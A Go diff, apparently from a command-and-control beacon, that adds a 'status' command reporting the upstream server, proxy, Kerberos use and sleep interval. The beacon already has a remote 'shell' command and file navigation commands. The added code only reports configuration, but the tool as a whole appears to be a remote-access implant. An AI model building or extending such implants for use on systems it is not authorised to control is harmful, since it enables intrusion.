@@ -27,10 +27,11 @@ var SLEEP_TIME = 1 * time.Second
 var CWD = ""
 
 var COMMAND_MAP = map[string]func(cmd string) (string, string, error){
-	"shell": runBashWithTimeout,
-	"pwd":   getCwd,
-	"cd":    changeDirectory,
-	"ls":    listDirectory,
+	"shell":  runBashWithTimeout,
+	"pwd":    getCwd,
+	"cd":     changeDirectory,
+	"ls":     listDirectory,
+	"status": getBeaconStatus,
 }
 
 func init() {
@@ -45,6 +46,10 @@ func init() {
 
 func getCwd(_ string) (string, string, error) {
 	return CWD, "", nil
+}
+
+func getBeaconStatus(_ string) (string, string, error) {
+	return fmt.Sprintf("Upstream: %s\nProxy: %s\nUsing KRB: %t\nSleep Time: %s", UPSTREAM, PROXY_URL, USE_KRB, SLEEP_TIME), "", nil
 }
 
 func changeDirectory(command string) (string, string, error) {
